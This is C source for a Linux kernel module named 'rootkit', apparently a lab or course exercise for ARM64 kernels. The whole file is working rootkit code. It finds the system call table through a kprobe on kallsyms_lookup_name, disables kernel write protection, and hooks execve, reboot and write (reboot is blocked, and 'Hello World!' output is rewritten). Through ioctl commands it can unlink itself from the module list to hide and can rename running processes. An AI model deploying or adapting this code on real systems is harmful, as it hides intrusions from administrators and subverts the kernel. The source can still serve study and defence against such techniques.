#include <linux/sched.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/version.h>
#include <linux/sched/signal.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/cdev.h>
#include <asm/syscall.h>
#include <linux/kprobes.h>
#include <linux/types.h>
#include <linux/errno.h>
#include <asm/pgtable-types.h>
#include <asm/ptrace.h>
#include <linux/string.h>
#include "rootkit.h"
#include <linux/list.h>

#define OURMODNAME	"rootkit"

MODULE_AUTHOR("FOOBAR");
MODULE_DESCRIPTION("FOOBAR");
MODULE_LICENSE("Dual MIT/GPL");
MODULE_VERSION("0.1");

static int major;
struct cdev *kernel_cdev;
static struct kprobe kp = {
	.symbol_name = "kallsyms_lookup_name",
};

/*Masqerade*/
struct task_struct *task;
struct masq_proc *local_list;
struct masq_proc_req req_list;

/*Linked list for all installed modules*/
static struct list_head *module_list;
static int hide  = 0;

/*syscall_table pointer*/
unsigned long *syscall_table;

/*Function pointers point to hidden functions.*/
typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
typedef void (*update_mapping_prot_t)(phys_addr_t phys, unsigned long virt,
					phys_addr_t size, pgprot_t prot);
update_mapping_prot_t update_mapping_prot;

/*Mine sys call function pointer*/
asmlinkage long (*mine_execve_ptr)(const struct pt_regs *regs);
asmlinkage long (*mine_reboot_ptr)(const struct pt_regs *regs);
asmlinkage long (*mine_write_ptr)(const struct pt_regs *regs);

/*Keep origin syscall handler poniter*/
asmlinkage long (*origin_execve_ptr)(const struct pt_regs *regs);
asmlinkage long (*origin_reboot_ptr)(const struct pt_regs *regs);
asmlinkage long (*origin_write_ptr)(const struct pt_regs *regs);

static void do_masq(int i)
{
	for_each_process(task) {
		if (strncmp(task->comm, local_list[i].orig_name, 16) == 0) {
			strncpy(task->comm, local_list[i].new_name, 16);
			break;
		}
	}
}

static void my_masq(void)
{
	int i = 0;

	while (i < req_list.len) {
		if (strlen(local_list[i].orig_name) <=
				strlen(local_list[i].new_name)) {
			i++;
			continue;
		}
		do_masq(i);
		i++;
	}
}

/*Set kallsyms_lookup_name function pointer, update_mapping_prot funtion
 * pointer and return pointer to system call table.
 */
static unsigned long find_systemcall_table(void)
{

	kallsyms_lookup_name_t kallsyms_lookup_name = 0;

	int ret;

	ret = register_kprobe(&kp);

	if (ret < 0)
		return ret;

	kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
	unregister_kprobe(&kp);

	/*Find kalsyms_lookup_name address*/
	if (*kallsyms_lookup_name == NULL)
		return -EFAULT;

	syscall_table = (void *)kallsyms_lookup_name("sys_call_table");
	update_mapping_prot = (void *)kallsyms_lookup_name(
			"update_mapping_prot");

	if (syscall_table != NULL) {
		/*Keep origin sys call handler pointer*/
		origin_execve_ptr = (long (*)(const struct pt_regs *))
					syscall_table[__NR_execve];
		origin_reboot_ptr = (long (*)(const struct pt_regs *))
					syscall_table[__NR_reboot];
		origin_write_ptr = (long (*)(const struct pt_regs *))
					syscall_table[__NR_write];

		return (long)syscall_table;
	} else {
		return -ENXIO;
	}

	return -ENXIO;
}

asmlinkage long mine_execve(const struct pt_regs *regs)
{
	int ret = 0;
	char __user *filename = (char *)regs->regs[0];
	char path_name[NAME_MAX] = {0};
	long state = strncpy_from_user(path_name, filename, NAME_MAX);

	if (state > 0)
		pr_info("exec %s\n", path_name);
	else
		return -EFAULT;

	ret = (*origin_execve_ptr)(regs);
	return ret;
}

asmlinkage long mine_reboot(const struct pt_regs *regs)
{
	return -1;
}

asmlinkage long mine_write(const struct pt_regs *regs)
{
	int ret = 0;
	char *replace_str = "byebyeworld\n\n";
	char *hello_world = "Hello World!\n";
	char cmp_str[NAME_MAX] = {0};

	if (strncpy_from_user(cmp_str, (void __user *)regs->regs[1],
						NAME_MAX) > 0) {
		if (strncmp(cmp_str, hello_world, 13) == 0)
			if (copy_to_user((void __user *)regs->regs[1],
				replace_str, sizeof(char) * 13)) {
				return -EFAULT;
	}
	} else
		return -EFAULT;
	ret = (*origin_write_ptr)(regs);
	return ret;
}

static int hooking(void)
{
	unsigned long start_rodata, init_begin, section_size = 0;

	find_systemcall_table();

	mine_execve_ptr = &mine_execve;
	mine_reboot_ptr = &mine_reboot;
	mine_write_ptr = &mine_write;

	if (!syscall_table)
		return -EFAULT;

	if (!update_mapping_prot)
		return -EFAULT;

	start_rodata = (unsigned long)kallsyms_lookup_name("__start_rodata");
	init_begin = (unsigned long)kallsyms_lookup_name("__init_begin");

	if (start_rodata == 0 || init_begin == 0)
		return -EFAULT;

	section_size = init_begin - start_rodata;

	preempt_disable();
	/*Disable write protection*/
	update_mapping_prot(__pa_symbol(start_rodata), start_rodata,
			section_size, PAGE_KERNEL);

	syscall_table[__NR_execve] = (unsigned long)mine_execve_ptr;
	syscall_table[__NR_reboot] = (unsigned long)mine_reboot_ptr;
	syscall_table[__NR_write] = (unsigned long)mine_write_ptr;

	/*Enable write protection*/
	update_mapping_prot(__pa_symbol(start_rodata), start_rodata,
			section_size, PAGE_KERNEL_RO);
	preempt_enable();

	return 0;
}

static int unhooking(void)
{
	unsigned long start_rodata, init_begin, section_size = 0;

	start_rodata = (unsigned long)kallsyms_lookup_name("__start_rodata");
	init_begin = (unsigned long)kallsyms_lookup_name("__init_begin");

	if (start_rodata == 0 || init_begin == 0)
		return -EFAULT;

	section_size = init_begin - start_rodata;

	preempt_disable();
	update_mapping_prot(__pa_symbol(start_rodata), start_rodata,
			section_size, PAGE_KERNEL);

	syscall_table[__NR_execve] = (unsigned long)origin_execve_ptr;
	syscall_table[__NR_reboot] = (unsigned long)origin_reboot_ptr;
	syscall_table[__NR_write] = (unsigned long)origin_write_ptr;

	update_mapping_prot(__pa_symbol(start_rodata), start_rodata,
			section_size, PAGE_KERNEL);
	preempt_enable();

	return 0;
}

static int rootkit_open(struct inode *inode, struct file *filp)
{

	printk(KERN_INFO "%s\n", __func__);
	return 0;
}

static int rootkit_release(struct inode *inode, struct file *filp)
{
	printk (KERN_INFO "%s\n", __func__);
	return 0;
}

static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
		unsigned long arg)
{
	int size = 0;
	int ret = 0;
	struct masq_proc_req *arg_ptr;

	printk (KERN_INFO "%s\n", __func__);


	switch (ioctl) {
		case IOCTL_MOD_HOOK:
			hooking();
			break;

		case IOCTL_MOD_HIDE:
			if (!hide) {
				hide = 1;
				module_list = THIS_MODULE->list.prev;
				list_del(&THIS_MODULE->list);
			}
			else {
				hide = 0;
				list_add(&THIS_MODULE->list, module_list);
			}
			break;

		case IOCTL_MOD_MASQ: {
			arg_ptr = (void  __user *)arg;
			ret = copy_from_user(&req_list, arg_ptr, sizeof(req_list));

			if (ret != 0) {
				return -EFAULT;
			}

			size = req_list.len * sizeof(struct masq_proc);

			if (!req_list.list) {
				return -ENOMEM;
			}

			local_list = kmalloc(size, GFP_KERNEL);

			if (!local_list)
				return -ENOMEM;
			if (copy_from_user(local_list, req_list.list, size) != 0)
				return -EFAULT;

			my_masq();
			kfree(local_list);
			break;
		}	
		default:
			ret = -EINVAL;
	}
	return 0;
}

struct file_operations fops = {
	open:		rootkit_open,
	unlocked_ioctl:	rootkit_ioctl,
	release:	rootkit_release,
	owner:		THIS_MODULE
};

static int __init rootkit_init(void)
{
	int ret;
	dev_t dev_no, dev;

	kernel_cdev = cdev_alloc();
	kernel_cdev->ops = &fops;
	kernel_cdev->owner = THIS_MODULE;

	ret = alloc_chrdev_region(&dev_no , 0, 1, "rootkit");
	if (ret < 0) {
		pr_info("major number allocation failed\n");
		return ret;
	}

	major = MAJOR(dev_no);
	dev = MKDEV(major,0);
	printk("The major number for your device is %d\n", major);
	ret = cdev_add( kernel_cdev,dev,1);
	if(ret < 0 )
	{
		pr_info(KERN_INFO "unable to allocate cdev");
		return ret;
	}

	return 0;
}

static void __exit rootkit_exit(void)
{
	// TODO: unhook syscall
	unhooking();
	pr_info("%s: removed\n", OURMODNAME);
	cdev_del(kernel_cdev);
	unregister_chrdev_region(major, 1);
}

module_init(rootkit_init);
module_exit(rootkit_exit);
